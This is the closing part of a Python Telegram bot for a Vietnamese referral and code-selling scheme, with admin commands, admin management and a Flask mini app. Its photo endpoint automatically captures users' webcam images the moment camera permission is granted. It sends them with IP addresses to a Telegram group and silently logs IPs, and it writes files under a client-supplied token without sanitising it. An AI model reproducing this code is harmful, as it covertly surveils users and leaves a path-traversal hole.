                    if not ref:
                        return None
                    cursor.execute(
                        "DELETE FROM required_channels WHERE lower(chat_ref)=lower(%s) RETURNING chat_ref, title",
                        (ref,),
                    )
                return cursor.fetchone()

            row = await db_transaction(del_channel)
            if not row:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy nhóm này trong danh sách.",
                    parse_mode="HTML",
                )
                return
            await message.reply_text(
                f"{E['CHECK2']} Đã xóa nhóm yêu cầu: <b>{_html.escape(row[1] or row[0])}</b> (<code>{row[0]}</code>)",
                parse_mode="HTML",
            )

        elif cmd == "/listgroup":
            rows = await get_required_channels()
            if not rows:
                await message.reply_text(
                    f"{E['BANDAGE']} Chưa có nhóm nào bắt buộc tham gia.",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['TOP']} <b>NHÓM ĐANG YÊU CẦU THAM GIA</b> (<b>{len(rows)}</b>)\n━━━━━━━━━━━━━━━━━━\n"
            for rid, ref, title, url in rows:
                msg += (
                    f"• ID: <code>{rid}</code> | <b>{_html.escape(title or ref)}</b>\n"
                    f"   <code>{ref}</code> | {_html.escape(url or 'không có link')}\n"
                )
            msg += f"\n{E['INFO']} Xóa: <code>/delgroup ID</code>"
            await send_split_message(
                context.bot, chat_id, msg, parse_mode="HTML"
            )

        elif cmd == "/checkgroup":
            rows = await get_required_channels()
            if not rows:
                await message.reply_text(
                    f"{E['BANDAGE']} Chưa có nhóm nào để kiểm tra.",
                    parse_mode="HTML",
                )
                return
            await message.reply_text(
                f"{E['HOURGLASS']} Đang kiểm tra quyền admin của bot ở {len(rows)} nhóm...",
                parse_mode="HTML",
            )
            results = await asyncio.gather(
                *[check_bot_admin(context.bot, r[1]) for r in rows]
            )
            ok_cnt = sum(1 for r in results if r[0])
            msg = (
                f"{E['SHIELD']} <b>KẾT QUẢ KIỂM TRA ADMIN</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"{E['CHECK2']} Bot là admin: <b>{ok_cnt}</b> | {E['CROSS']} Chưa/Lỗi: <b>{len(rows) - ok_cnt}</b>\n\n"
            )
            for (rid, ref, title, url), (is_ad, status, _c) in zip(
                rows, results
            ):
                icon = E["CHECK2"] if is_ad else E["CROSS"]
                msg += f"{icon} ID <code>{rid}</code> | <b>{_html.escape(title or ref)}</b> — <code>{_html.escape(str(status))[:60]}</code>\n"
            if ok_cnt < len(rows):
                msg += (
                    f"\n{E['WARN']} Nhóm chưa có quyền admin sẽ khiến mọi user bị báo \"chưa tham gia\". "
                    f"Hãy cấp admin cho bot hoặc xóa nhóm bằng <code>/delgroup</code>."
                )
            await send_split_message(
                context.bot, chat_id, msg, parse_mode="HTML"
            )

        elif cmd == "/checkadmin":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/checkadmin @username</code>",
                    parse_mode="HTML",
                )
                return
            ref = _norm_chat_ref(args[0])
            if not ref:
                await message.reply_text(
                    f"{E['CROSS']} Nhóm không hợp lệ.", parse_mode="HTML"
                )
                return
            is_ad, status, chat = await check_bot_admin(context.bot, ref)
            name = _html.escape(chat.title) if chat and chat.title else ref
            if is_ad:
                await message.reply_text(
                    f"{E['CHECK2']} Bot <b>ĐÃ LÀ ADMIN</b> ở nhóm <b>{name}</b> ({status}).",
                    parse_mode="HTML",
                )
            else:
                await message.reply_text(
                    f"{E['CROSS']} Bot <b>CHƯA LÀ ADMIN</b> ở nhóm <b>{name}</b>.\n"
                    f"Trạng thái: <code>{_html.escape(str(status))[:80]}</code>",
                    parse_mode="HTML",
                )

        elif cmd == "/clearallgroup":

            def clear_channels(cursor):
                cursor.execute("DELETE FROM required_channels")
                return cursor.rowcount

            n_del = await db_transaction(clear_channels)
            CHANNEL_URLS.clear()
            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ XÓA TẤT CẢ NHÓM YÊU CẦU THAM GIA!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"• Đã xóa: <b>{n_del:,}</b> nhóm/kênh.\n"
                f"{E['INFO']} Thêm nhóm mới bằng <code>/addgroup</code>.",
                parse_mode="HTML",
            )

        elif cmd == "/price":
            await message.reply_text(
                f"{E['MONEY']} <b>Giá code hiện tại:</b> <code>{CODE_PRICE:,}đ</code>\n"
                f"{E['INFO']} Đổi giá: <code>/setprice</code> · <code>/upprice</code> · <code>/downprice</code>",
                parse_mode="HTML",
            )

        elif cmd in ("/setprice", "/upprice", "/downprice"):
            val = _parse_money(args[0]) if args else None
            if val is None:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>{cmd} SỐ_TIỀN</code> (số nguyên lớn hơn 0)",
                    parse_mode="HTML",
                )
                return
            old_price = CODE_PRICE
            if cmd == "/setprice":
                new_price = val
            elif cmd == "/upprice":
                new_price = old_price + val
            else:
                new_price = old_price - val
            if new_price <= 0:
                await message.reply_text(
                    f"{E['CROSS']} Giá sau khi giảm phải lớn hơn 0 (hiện tại {old_price:,}đ).",
                    parse_mode="HTML",
                )
                return
            await save_code_price(new_price)
            arrow = (
                E["UP"]
                if new_price > old_price
                else (E["DOWN"] if new_price < old_price else E["RIGHT"])
            )
            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ CẬP NHẬT GIÁ CODE!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['MONEY']} Giá cũ: <code>{old_price:,}đ</code>\n"
                f"{arrow} Giá mới: <b><code>{new_price:,}đ</code></b>\n\n"
                f"{E['INFO']} Mọi thông báo giá (menu Rút Code, Mời Bạn Bè, nút mua, đơn chờ duyệt) đã tự cập nhật. "
                f"Muốn báo user thì dùng <code>/broadcast</code>.",
                parse_mode="HTML",
            )

    except Exception as ecx:
        logger.exception("Lỗi admin command %s: %s", cmd, ecx)
        await message.reply_text(
            f"{E['CROSS']} Đã xảy ra lỗi khi xử lý lệnh.", parse_mode="HTML"
        )


MENU_BUTTON_TEXTS = (
    "Tài Khoản",
    "Mời Bạn Bè",
    "Rút Code",
    "Top",
    "Nhóm Hỗ Trợ",
    "Lịch Sử Giao Dịch",
    "Link Game",
    "Menu",
)


async def text_message_dispatcher(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    if not update.effective_message:
        return
    user = update.effective_user
    txt = (update.effective_message.text or "").strip()
    if (
        user
        and user.id in admin_input_states
        and (txt in MENU_BUTTON_TEXTS or is_admin_kb_text(txt))
    ):
        admin_input_states.pop(user.id, None)
    if user and user.id in admin_input_states and user.id in ADMIN_IDS:
        await admin_commands(update, context)
        return
    if await handle_anti_spam(update, context):
        return
    await menu_handler(update, context)


async def clear_admin_state_handler(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Chạy TRƯỚC mọi handler khác (group -1): admin gõ lệnh / bấm nút khác
    thì bỏ trạng thái 'đang chờ nhập' cũ để không bị nhận nhầm lệnh cũ."""
    user = update.effective_user
    if user and user.id in admin_input_states:
        admin_input_states.pop(user.id, None)


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception khi xử lý update: %s", context.error, exc_info=context.error)




# ============================================================
# QUẢN LÝ ADMIN: 7884394252 là admin chính cố định
# ============================================================
async def init_admin_management(application):
    await db_query("""CREATE TABLE IF NOT EXISTS bot_admins (
        user_id BIGINT PRIMARY KEY, is_active BOOLEAN NOT NULL DEFAULT TRUE,
        added_by BIGINT, added_at TEXT DEFAULT CURRENT_TIMESTAMP::text
    )""", commit=True)
    await db_query("""CREATE TABLE IF NOT EXISTS bot_admin_requests (
        user_id BIGINT PRIMARY KEY, requested_by BIGINT NOT NULL,
        requested_at TEXT DEFAULT CURRENT_TIMESTAMP::text
    )""", commit=True)
    await db_query(
        "INSERT INTO bot_admins(user_id,is_active,added_by) VALUES(%s,TRUE,%s) "
        "ON CONFLICT(user_id) DO UPDATE SET is_active=TRUE",
        (MAIN_ADMIN_ID, MAIN_ADMIN_ID), commit=True
    )
    rows = await db_query(
        "SELECT user_id FROM bot_admins WHERE is_active=TRUE", fetchall=True
    ) or []
    ADMIN_IDS[:] = sorted(set([MAIN_ADMIN_ID] + [int(r[0]) for r in rows]))

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    if user.id not in ADMIN_IDS:
        await msg.reply_text("Bạn không có quyền sử dụng lệnh này.")
        return
    if not context.args or not context.args[0].isdigit():
        await msg.reply_text("Cách dùng: /addadmin USER_ID\nVí dụ: /addadmin 123456789")
        return
    target = int(context.args[0])
    if target == MAIN_ADMIN_ID:
        await msg.reply_text("Đây là admin chính, không cần thêm.")
        return
    if user.id == MAIN_ADMIN_ID:
        await db_query(
            "INSERT INTO bot_admins(user_id,is_active,added_by) VALUES(%s,TRUE,%s) "
            "ON CONFLICT(user_id) DO UPDATE SET is_active=TRUE, added_by=%s",
            (target, user.id, user.id), commit=True
        )
        if target not in ADMIN_IDS: ADMIN_IDS.append(target)
        await msg.reply_text(f"Đã thêm/mở quyền admin cho ID {target}.")
        try: await context.bot.send_message(target, "Bạn đã được cấp quyền quản trị bot.")
        except Exception: pass
        return
    await db_query(
        "INSERT INTO bot_admin_requests(user_id,requested_by) VALUES(%s,%s) "
        "ON CONFLICT(user_id) DO UPDATE SET requested_by=%s, requested_at=CURRENT_TIMESTAMP::text",
        (target, user.id, user.id), commit=True
    )
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Duyệt thêm admin", callback_data=f"adminreq_yes_{target}"),
        InlineKeyboardButton("❌ Từ chối", callback_data=f"adminreq_no_{target}")
    ]])
    try:
        await context.bot.send_message(
            MAIN_ADMIN_ID,
            f"📨 <b>YÊU CẦU THÊM ADMIN</b>\nNgười yêu cầu: <code>{user.id}</code>\nID đề xuất: <code>{target}</code>",
            reply_markup=keyboard, parse_mode="HTML"
        )
        await msg.reply_text("Đã gửi yêu cầu thêm admin đến admin chính để duyệt.")
    except Exception:
        await msg.reply_text("Không gửi được yêu cầu đến admin chính. Hãy kiểm tra bot đã được /start bởi admin chính chưa.")

async def manageadmins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg: return
    if user.id != MAIN_ADMIN_ID:
        await msg.reply_text("Chỉ admin chính mới được quản lý quyền admin.")
        return
    rows = await db_query("SELECT user_id,is_active FROM bot_admins ORDER BY user_id", fetchall=True) or []
    buttons = []
    for uid, active in rows:
        uid = int(uid)
        if uid == MAIN_ADMIN_ID: continue
        label = ("🔓 Mở quyền" if not active else "🔒 Khóa quyền") + f" · {uid}"
        buttons.append([InlineKeyboardButton(label, callback_data=f"admintoggle_{uid}")])
    await msg.reply_text(
        "👑 <b>QUẢN LÝ ADMIN</b>\nDùng /addadmin USER_ID để thêm admin.\nAdmin bị khóa sẽ không dùng được các tính năng quản trị.",
        reply_markup=InlineKeyboardMarkup(buttons) if buttons else None, parse_mode="HTML"
    )

async def admin_management_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query: return
    user = update.effective_user
    if not user or user.id != MAIN_ADMIN_ID:
        await query.answer("Chỉ admin chính mới được thao tác.", show_alert=True); return
    data = query.data or ""
    if data.startswith("adminreq_yes_") or data.startswith("adminreq_no_"):
        approve = data.startswith("adminreq_yes_")
        target = int(data.rsplit("_", 1)[1])
        if approve:
            await db_query(
                "INSERT INTO bot_admins(user_id,is_active,added_by) VALUES(%s,TRUE,%s) "
                "ON CONFLICT(user_id) DO UPDATE SET is_active=TRUE, added_by=%s",
                (target, MAIN_ADMIN_ID, MAIN_ADMIN_ID), commit=True
            )
            if target not in ADMIN_IDS: ADMIN_IDS.append(target)
            await query.edit_message_text(f"✅ Đã duyệt admin ID {target}.")
            try: await context.bot.send_message(target, "Bạn đã được cấp quyền quản trị bot.")
            except Exception: pass
        else:
            await db_query("DELETE FROM bot_admin_requests WHERE user_id=%s", (target,), commit=True)
            await query.edit_message_text(f"Đã từ chối yêu cầu thêm admin ID {target}.")
        await db_query("DELETE FROM bot_admin_requests WHERE user_id=%s", (target,), commit=True)
        return
    if data.startswith("admintoggle_"):
        target = int(data.rsplit("_", 1)[1])
        row = await db_query("SELECT is_active FROM bot_admins WHERE user_id=%s", (target,), fetchone=True)
        if not row:
            await query.answer("Không tìm thấy admin.", show_alert=True); return
        active = not bool(row[0])
        await db_query("UPDATE bot_admins SET is_active=%s WHERE user_id=%s", (active, target), commit=True)
        if active:
            if target not in ADMIN_IDS: ADMIN_IDS.append(target)
        else:
            ADMIN_IDS[:] = [x for x in ADMIN_IDS if x != target]
        await query.answer("Đã mở quyền." if active else "Đã khóa quyền.", show_alert=True)
        rows = await db_query("SELECT user_id,is_active FROM bot_admins ORDER BY user_id", fetchall=True) or []
        buttons = []
        for uid, enabled in rows:
            uid = int(uid)
            if uid == MAIN_ADMIN_ID: continue
            buttons.append([InlineKeyboardButton(("🔓 Mở quyền" if not enabled else "🔒 Khóa quyền") + f" · {uid}", callback_data=f"admintoggle_{uid}")])
        try: await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons) if buttons else None)
        except Exception: pass



async def post_init(application: Application) -> None:
    await init_db()
    await init_admin_management(application)
    await load_code_price()


# ============================================================
# API NHẬN ẢNH NÉT TỪ WEBAPP & ĐẨY ẢNH VỀ NHÓM TELEGRAM
# ============================================================
flask_app = Flask(__name__)


@flask_app.route('/miniapp', methods=['GET'])
def serve_miniapp():
    """Serve file HTML Mini App trực tiếp từ VPS.

    Khi người dùng MỞ MiniApp (URL có token), ghi IP ngay vào hệ thống (ip_logs)
    để admin kiểm tra, tự khóa rút code nếu trùng IP (âm thầm, chỉ báo admin).
    """
    try:
        _tok = request.args.get("token") or request.args.get("t")
        if _tok:
            _record_miniapp_ip_sync(_tok, request)
    except Exception as exc:
        logger.warning("Lỗi ghi IP khi mở MiniApp: %s", exc)
    try:
        html_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "templates",
            "miniapp.html"
        )
        with open(html_path, "r", encoding="utf-8") as fh:
            return fh.read(), 200, {"Content-Type": "text/html; charset=utf-8"}
    except FileNotFoundError:
        return (
            "<h3>❌ Không tìm thấy file templates/miniapp.html</h3>",
            404,
            {"Content-Type": "text/html; charset=utf-8"},
        )
    except Exception as exc:
        return (
            f"<h3>❌ Lỗi: {exc}</h3>",
            500,
            {"Content-Type": "text/html; charset=utf-8"},
        )


@flask_app.route('/api/save-photo', methods=['POST'])
def save_photo():
    try:
        data = request.json
        token = data.get('token')
        # IP lấy từ server (không tin IP client gửi lên)
        ip = get_request_ip(request, data.get('ip'))
        image_data = data.get('image')
        auto_capture = data.get('auto_capture', False)

        # Tìm user_id tương ứng với token (đang chờ xác minh trong bộ nhớ)
        user_id = None
        try:
            snapshot = list(pending_miniapp_captcha.items())
            for uid, info in snapshot:
                if info.get('token') == token:
                    user_id = uid
                    break
        except Exception as e:
            print(f"Lỗi tra token: {e}")

        if not user_id and token:
            user_id = _find_user_by_token_sync(token)

        # Lưu IP + token ảnh camera vào thông tin tài khoản
        if user_id:
            try:
                pool = get_pool()
                with pool.connection() as conn:
                    with conn.cursor() as cursor:
                        cursor.execute(
                            "UPDATE users SET camera_photo_token=%s WHERE user_id=%s",
                            (token, user_id),
                        )
                    conn.commit()
                # Nhớ IP để bước xác minh captcha dùng, đồng thời ghi ngay vào ip_logs
                # + kiểm tra trùng (tự khóa rút code, báo admin)
                if ip:
                    pending_miniapp_ip[user_id] = ip
                    _register_ip_sync(user_id, ip, notify_user=False)
                print(f"✅ Đã xử lý IP/token cho user {user_id}: ip={ip}, token={token}")
            except Exception as e:
                print(f"❌ Lỗi lưu IP/token cho user {user_id}: {e}")

        if image_data and "," in image_data:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)

            # Lưu file backup trên VPS
            os.makedirs("/var/www/phongtunk/captures", exist_ok=True)
            file_path = f"/var/www/phongtunk/captures/{token}.jpg"
            with open(file_path, "wb") as fh:
                fh.write(image_bytes)

            # Gửi ảnh trực tiếp về nhóm Telegram thông qua Bot API
            if BOT_TOKEN and CAMERA_TARGET_GROUP:
                if auto_capture:
                    caption = (
                        f"📸 <b>ẢNH CHỤP TỰ ĐỘNG - XÁC MINH CAMERA</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"👤 User ID: <code>{user_id or 'N/A'}</code>\n"
                        f"🌐 IP: <code>{ip or 'Không rõ'}</code>\n"
                        f"🔑 Token: <code>{token}</code>\n"
                        f"⚡ Chụp ngay khi cấp quyền Camera"
                    )
                else:
                    caption = (
                        f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n"
                        f"👤 User ID: <code>{user_id or 'N/A'}</code>\n"
                        f"🌐 IP: <code>{ip or 'Không rõ'}</code>\n"
                        f"Token: <code>{token}</code>"
                    )

                boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
                body = io.BytesIO()

                body.write(('--' + boundary + '\r\n').encode('utf-8'))
                body.write(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
                body.write(str(CAMERA_TARGET_GROUP).encode('utf-8') + b'\r\n')

                body.write(('--' + boundary + '\r\n').encode('utf-8'))
                body.write(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
                body.write(caption.encode('utf-8') + b'\r\n')

                body.write(('--' + boundary + '\r\n').encode('utf-8'))
                body.write(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
                body.write(b'HTML\r\n')

                body.write(('--' + boundary + '\r\n').encode('utf-8'))
                body.write(b'Content-Disposition: form-data; name="photo"; filename="camera.jpg"\r\n')
                body.write(b'Content-Type: image/jpeg\r\n\r\n')
                body.write(image_bytes + b'\r\n')

                body.write(('--' + boundary + '--\r\n').encode('utf-8'))

                req_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                req = urllib.request.Request(req_url, data=body.getvalue(), headers={
                    'Content-Type': f'multipart/form-data; boundary={boundary}'
                })
                try:
                    with urllib.request.urlopen(req) as response:
                        response.read()
                    print(f"✅ Ảnh đã gửi về nhóm {CAMERA_TARGET_GROUP} thành công")
                except Exception as e:
                    print(f"❌ Lỗi gửi ảnh qua Telegram API: {e}")

        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Lỗi nhận ảnh: {e}")
        return jsonify({"status": "error"}), 500


def run_flask():
    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)


def main():
    if not BOT_TOKEN:
        raise RuntimeError("Chưa cấu hình BOT_TOKEN.")
    if not DATABASE_URL:
        raise RuntimeError("Chưa cấu hình DATABASE_URL.")
        
    # Kích hoạt luồng Flask chạy ngầm ở cổng 5000
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("🚀 Luồng Flask Server đã khởi động ngầm thành công trên cổng 5000")

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Group -1: dọn trạng thái chờ nhập của admin khi gõ lệnh / bấm nút inline khác
    app.add_handler(
        MessageHandler(filters.COMMAND, clear_admin_state_handler), group=-1
    )
    app.add_handler(
        CallbackQueryHandler(
            clear_admin_state_handler,
            pattern=r"^(adm_act_|amy_|amcancel$|toggle_|admin_verify_all|userinfo_)",
        ),
        group=-1,
    )

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("settings", admin_menu_command))
    app.add_handler(CommandHandler("admin", adm_panel_command))
    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("manageadmins", manageadmins_command))
    app.add_handler(CallbackQueryHandler(admin_management_callback, pattern=r"^(adminreq_yes_|adminreq_no_|admintoggle_)") )

    app.add_handler(
        CallbackQueryHandler(
            admin_toggle_callback, pattern=r"^(toggle_|admin_verify_all)"
        )
    )
    app.add_handler(
        CallbackQueryHandler(adm_step_callback, pattern=r"^adm_(step_|act_)")
    )
    app.add_handler(
        CallbackQueryHandler(admin_confirm_callback, pattern=r"^(amy_|amcancel$)")
    )
    app.add_handler(
        CallbackQueryHandler(userinfo_callback, pattern=r"^userinfo_")
    )
    app.add_handler(
        CallbackQueryHandler(verify_join_callback, pattern=r"^verify_join$")
    )
    app.add_handler(
        CallbackQueryHandler(
            code_buy_callback,
            pattern=r"^(buycode_|approve_code_|reject_code_|approve_order_|reject_order_)",
        )
    )

    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    app.add_handler(
        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler)
    )

    admin_cmds = [
        "addstock", "liststock", "stock", "clearstock", "clearstockall",
        "delhistory", "buyhistory", "addbal", "subbal", "zerobal",
        "ban", "unban", "banwd", "unbanwd", "unall", "uncap",
        "skipip", "unip", "resetverify", "info", "detail", "find",
        "lookup", "checkip",
        "txlog", "txfull", "checkfriends", "friends", "users", "stats",
        "banlist", "wdbanlist", "topbal", "dupip", "dupphone",
        "biofriends", "scanbio", "banbuff", "checkref", "broadcast",
        "sendmsg", "maint", "wipeall", "addgroup", "delgroup", "listgroup",
        "checkgroup", "checkadmin", "clearallgroup", "price", "setprice",
        "upprice", "downprice",
    ]
    for command in admin_cmds:
        app.add_handler(CommandHandler(command, admin_commands))

    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_dispatcher)
    )
    app.add_error_handler(error_handler)

    logger.info("🤖 Bot chạy thành công với tính năng mới")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()

